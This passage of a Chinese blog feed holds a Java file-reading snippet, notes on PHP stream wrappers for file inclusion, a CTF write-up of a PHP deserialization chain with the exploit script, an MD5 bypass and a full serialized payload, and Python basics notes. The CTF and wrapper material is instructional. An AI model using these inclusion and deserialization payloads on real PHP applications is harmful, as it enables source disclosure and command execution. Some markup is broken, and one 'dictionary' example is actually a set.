class="line"><span class="comment">//        System.out.println(n6);</span></span><br><span class="line"><span class="comment">//        int n7 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n7);</span></span><br><span class="line"><span class="comment">//        int n8 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n8);</span></span><br><span class="line">        <span class="type">int</span> n=fr.read();</span><br><span class="line">        <span class="keyword">while</span>(n!=-<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">            n=fr.read();</span><br><span class="line">        &#125;</span><br><span class="line">        fr.close();<span class="comment">//流关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php 伪协议</title>
    <url>/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>首先来看一下有哪些文件包含函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copyinclude、<span class="keyword">require</span>、<span class="keyword">include_once</span>、<span class="keyword">require_once</span>、highlight_file</span><br><span class="line">show_source 、readfile 、file_get_contents 、fopen 、file</span><br></pre></td></tr></table></figure>

<p>有哪些伪协议：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Copyfile:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="keyword">data</span>:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="keyword">expect</span>:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>



<h4 id="2-1-php-filter"><a href="#2-1-php-filter" class="headerlink" title="2.1 php:&#x2F;&#x2F;filter"></a>2.1 php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copy?page=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure>

<h4 id="2-2-file-协议"><a href="#2-2-file-协议" class="headerlink" title="2.2 file:&#x2F;&#x2F;协议"></a>2.2 file:&#x2F;&#x2F;协议</h4><p>用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响</p>
<p>即file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">Copy?path=file:<span class="regexp">//</span><span class="regexp">/var/</span>www/html/flag.txt</span><br></pre></td></tr></table></figure>

<h4 id="2-3-php-input"><a href="#2-3-php-input" class="headerlink" title="2.3 php:&#x2F;&#x2F;input"></a>2.3 php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行</p>
<p>php:&#x2F;&#x2F;input 可以用来生成一句话</p>
<p>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：</p>
<h4 id="2-4-data-协议"><a href="#2-4-data-协议" class="headerlink" title="2.4 data:&#x2F;&#x2F;协议"></a>2.4 data:&#x2F;&#x2F;协议</h4><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：</p>
<h4 id="2-5-zip-bzip2-zlib-协议"><a href="#2-5-zip-bzip2-zlib-协议" class="headerlink" title="2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h4><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p>
<p>如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731728678644.png"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化 + GC回收机制</title>
    <url>/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>f 复现的时候gc回收机制发现不会 写出来当笔记了</p>
<p>学习from：<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DQaqiI3Y5p2GbD</a></p>
<p>直接拿isctf的题目来进行练习</p>
<h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 帮天命人搜集法宝，重获齐天之姿！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$wu</span>=<span class="string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$j</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$yin</span>=<span class="string">&quot;s214587387a&quot;</span>;</span><br><span class="line">    <span class="variable">$yang</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="variable">$yang</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$yang</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$huo</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;huoyan=<span class="string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;jinjing=<span class="string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Jindou</span>=<span class="string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$f</span>=<span class="variable language_">$this</span>-&gt;yun;</span><br><span class="line">    <span class="variable">$f</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jingdouyun</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Qishier</span>=<span class="number">72</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bian</span>=<span class="string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">Jindouyun</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tianming;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Wukong&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就是gc回收机制加上反序列化</p>
<p>链子很简单</p>
<p>直接上exp了</p>
<?php
error_reporting(0);

# 帮天命人搜集法宝，重获齐天之姿！
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Jindou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Tianmingren</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming=<span class="keyword">new</span> <span class="title class_">Dinghaishenzhen</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun= <span class="keyword">new</span> <span class="title class_">Huoyanjinjing</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun-&gt;huoyan= <span class="keyword">new</span> <span class="title class_">Wuzhishan</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

因为这里还存在md5的绕过 直接让J=0e215962017

最后因为还要绕过异常处理 所以我们直接反序列化一个数组 让第二个索引为0 即可绕过

payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?J=0e215962017</span><br><span class="line"></span><br><span class="line">POST=Wukong=a:2:&#123;i:0;O:11:&quot;Tianmingren&quot;:2:&#123;s:8:&quot;tianming&quot;;O:15:&quot;Dinghaishenzhen&quot;:2:&#123;s:6:&quot;Jindou&quot;;N;s:3:&quot;yun&quot;;O:13:&quot;Huoyanjinjing&quot;:2:&#123;s:6:&quot;huoyan&quot;;O:9:&quot;Wuzhishan&quot;:3:&#123;s:2:&quot;wu&quot;;N;s:3:&quot;zhi&quot;;N;s:4:&quot;shan&quot;;N;&#125;s:7:&quot;jinjing&quot;;N;&#125;&#125;s:3:&quot;ren&quot;;N;&#125;i:0;i:0;&#125;</span><br></pre></td></tr></table></figure>

### CTFSHOW卷王杯[easy unserialize]
]]></content>
      <categories>
        <category>unserialize</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础学习</title>
    <url>/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>Python是一种跨平台的编程语言，这意味着它可以在Windows，MacOS，Linux等多种平台上运行，甚至已经移植到Java和.NET虚拟机。它是免费和开源的。</p>
<p>即使当今的大多数Linux和Mac已经预装了Python，但该版本可能已过时。因此，安装最新版本始终是一个好主意。</p>
<p>说明：作者根据<a href="https://cainiaoplus.com/%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0">https://cainiaoplus.com/进行学习</a></p>
<p>下面学习过程我直接用linux python 来编写了</p>
<h2 id="Python-关键字和标识符"><a href="#Python-关键字和标识符" class="headerlink" title="Python 关键字和标识符"></a>Python 关键字和标识符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关键字是Python中的保留字。</span><br><span class="line"></span><br><span class="line">我们不能将关键字用作 [变量名](https://cainiaoplus.com/python/python-variables-datatypes.html)，[函数](https://cainiaoplus.com/python/python-function.html)名或任何其他标识符。它们用于定义Python语言的语法和结构。</span><br><span class="line"></span><br><span class="line">在Python中，关键字区分大小写。</span><br><span class="line"></span><br><span class="line">Python 3.7中有 33 个关键字。该数字在一段时间内可能会略有变化。</span><br><span class="line"></span><br><span class="line">所有关键字必须是小写的，其中 True，False 和 None 除外。下面列出了所有关键字。</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>False</th>
<th>await</th>
<th>else</th>
<th>import</th>
<th>pass</th>
</tr>
</thead>
<tbody><tr>
<td>None</td>
<td>break</td>
<td>except</td>
<td>in</td>
<td>raise</td>
</tr>
<tr>
<td>True</td>
<td>class</td>
<td>finally</td>
<td>is</td>
<td>return</td>
</tr>
<tr>
<td>and</td>
<td>continue</td>
<td>for</td>
<td>lambda</td>
<td>try</td>
</tr>
<tr>
<td>as</td>
<td>def</td>
<td>from</td>
<td>nonlocal</td>
<td>while</td>
</tr>
<tr>
<td>assert</td>
<td>del</td>
<td>global</td>
<td>not</td>
<td>with</td>
</tr>
<tr>
<td>async</td>
<td>elif</td>
<td>if</td>
<td>or</td>
<td>yield</td>
</tr>
</tbody></table>
<h2 id="Python标识符"><a href="#Python标识符" class="headerlink" title="Python标识符"></a>Python标识符</h2><p>标识符是给诸如类，函数，变量等实体的名称。它有助于将一个实体与另一个实体区分开。</p>
<h3 id="编写标识符的规则"><a href="#编写标识符的规则" class="headerlink" title="编写标识符的规则"></a>编写标识符的规则</h3><ol>
<li>标识符可以是小写字母<strong>（a 至 z）</strong>或大写字母<strong>（A 至 Z）</strong>或数字<strong>（0 至 9）</strong>或下划线(_)的组合。myClass，var_1，var_name_1, print_this_to_screen 都是有效的。</li>
<li>标识符不能以数字开头。1variable 是无效的，但 variable1 是有效的。</li>
<li>关键字不能用作标识符。</li>
</ol>
<h3 id="要记住的事情"><a href="#要记住的事情" class="headerlink" title="要记住的事情"></a>要记住的事情</h3><p>Python 是 <strong>区分大小写</strong> 的语言。这意味着 Variable 和 variable 是两个不同的变量。同时，也建议大家，在实际编程中，始终命名有意义的标识符。</p>
<p>虽然，c &#x3D; 10 也是有效的。但是使用 count &#x3D; 10 看起来会更有意义，并且即使您在经过一段长时间的间隔之后查看代码，也更容易弄清楚它的作用和它所代表的意义。</p>
<p>可以使用下划线分隔多个单词进行命名，例如：this_is_a_long_variable</p>
<h3 id="python-语句"><a href="#python-语句" class="headerlink" title="python 语句"></a>python 语句</h3><p>在Python中，语句的结尾用换行符标记。但是我们可以使一条语句扩展到具有多行连续字符（\）的多行。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 1 + 2 + 3 + \</span><br><span class="line">    4 + 5 + 6 + \</span><br><span class="line">    7 + 8 + 9</span><br></pre></td></tr></table></figure>

<p>这是显式的行继续。在Python中，在圆括号()，方括号[]和花括号{}中暗含换行符。例如，我们可以将上述多行语句实现为 []和{}也是如此</p>
<h3 id="Python缩进"><a href="#Python缩进" class="headerlink" title="Python缩进"></a>Python缩进</h3><p>大多数编程语言（例如C，C ++，Java）都使用大括号{}来定义代码块。<strong>而Python使用缩进</strong></p>
<p>代码块（<a href="https://cainiaoplus.com/python/python-function.html">函数的</a>主体，<a href="https://cainiaoplus.com/python/python-for-loop.html">循环的</a>主体等）以缩进开始，以第一条未缩进的行结束。缩进量取决于您，但是在整个块中缩进量必须保持一致。</p>
<p>通常，四个空格用于缩进，并且优先于制表符。</p>
<p>缩进不正确将导致IndentationError。</p>
<p>直接推进到集合的字面量集</p>
<h2 id="字面量集"><a href="#字面量集" class="headerlink" title="字面量集"></a>字面量集</h2><p>有四种不同的字面量集合：列表字面量，元组字面量，字典字面量 和 集合字面量。</p>
<p>eg:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits=[<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span> ,<span class="string">&quot;orange&quot;</span>]<span class="comment">#这是一个列表</span></span><br><span class="line">numbers=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">#这是一个元组</span></span><br><span class="line">alphabets=&#123;<span class="string">&quot;a:apple&quot;</span>,<span class="string">&quot;b:banana&quot;</span>,<span class="string">&quot;o:orange&quot;</span>&#125;<span class="comment">#这是一个字典</span></span><br><span class="line">vowels=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;<span class="comment">#这是一个集合</span></span><br><span class="line"><span class="comment">#这是是一些字面量集</span></span><br><span class="line"><span class="built_in">print</span>(fruits)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br><span class="line"><span class="built_in">print</span>(alphabets)</span><br><span class="line"><span class="built_in">print</span>(vowels)</span><br></pre></td></tr></table></figure>

<h2 id="Python-列表（List）"><a href="#Python-列表（List）" class="headerlink" title="Python 列表（List）"></a>Python 列表（List）</h2><p>在Python编程中，通过将所有项目（元素）放在方括号[]中并用逗号分隔来创建列表。</p>
<p>它可以具有任意数量的项目，并且它们可以具有不同的类型（整数，浮点数，字符串等）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 空 list</span></span><br><span class="line">my_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数list</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具有混合数据类型的列表</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">3.4</span>]</span><br></pre></td></tr></table></figure>

<p>同样，一个列表甚至可以将另一个列表作为项目。这称为嵌套列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 嵌套 list</span></span><br><span class="line">my_list = [<span class="string">&quot;mouse&quot;</span>, [<span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>], [<span class="string">&#x27;a&#x27;</span>]]</span><br></pre></td></tr></table></figure>

<p>访问列表中的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>])</span><br><span class="line">seconde_list =[<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&quot;Gu0f3n&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(seconde_list[<span class="number">2</span>][<span class="number">4</span>])</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#G</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure>

<h3 id="如何在Python中切片列表？"><a href="#如何在Python中切片列表？" class="headerlink" title="如何在Python中切片列表？"></a>如何在Python中切片列表？</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="comment"># 从第3元素至第5个元素</span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从开始到第4个元素</span></span><br><span class="line"><span class="built_in">print</span>(my_list[:-<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第6个元素至结束</span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元素开始到结束</span></span><br><span class="line"><span class="built_in">print</span>(my_list[:])</span><br></pre></td></tr></table></figure>

<p>通过将索引考虑到如下所示的元素之间，切片可以得到最佳的可视化效果。如果我们想要访问一个范围，我们需要两个下标来从列表中分割那部分。(冒号左边闭右边开{  <strong>(]</strong>  }))</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732016262903.png"></p>
<h3 id="如何更改或添加元素到列表？"><a href="#如何更改或添加元素到列表？" class="headerlink" title="如何更改或添加元素到列表？"></a>如何更改或添加元素到列表？</h3><p>List是可变的，也就是说，它们的元素可以更改，而不像<a href="https://www.cainiaoplus.com/python/python-string.html">string</a>或<a href="https://www.cainiaoplus.com/python/python-tuple.html">tuple</a>。</p>
<p>我们可以使用赋值运算符（&#x3D;）更改一个项目或一系列项目。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list[<span class="number">1</span>] =<span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list[<span class="number">2</span>:<span class="number">5</span>]=[<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>]<span class="comment">#改变3到5</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, 6, 6, 6, &#x27;n&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以使用append()方法将一个项目添加到列表中，或者使用extend()方法将多个项目添加到列表中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.append(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list.extend([<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6, 6, 6]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此外，我们可以使用insert()方法在需要的位置插入一个项，或者通过将多个项压缩到列表的一个空切片中来插入多个项</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">odd = [<span class="number">1</span>, <span class="number">9</span>]</span><br><span class="line">odd.insert(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: [1, 3, 9] </span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br><span class="line"></span><br><span class="line">odd[<span class="number">2</span>:<span class="number">2</span>] = [<span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: [1, 3, 5, 7, 9]</span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br></pre></td></tr></table></figure>

<h3 id="如何从列表中删除或删除元素？"><a href="#如何从列表中删除或删除元素？" class="headerlink" title="如何从列表中删除或删除元素？"></a>如何从列表中删除或删除元素？</h3><p>我们可以使用关键字del从列表中删除一个或多个项。它甚至可以完全删除列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;]</span></span><br><span class="line"><span class="comment">#NameError: name &#x27;my_list&#x27; is not defined</span></span><br></pre></td></tr></table></figure>

<p>我们可以使用remove()方法删除给定项目，也可以使用pop()方法删除给定索引处的项目。</p>
<p>如果未提供索引，则pop()方法将删除并返回最后一项。这有助于我们将列表实现为堆栈（先进先出数据结构）。</p>
<p>我们还可以使用该clear()方法清空列表。</p>
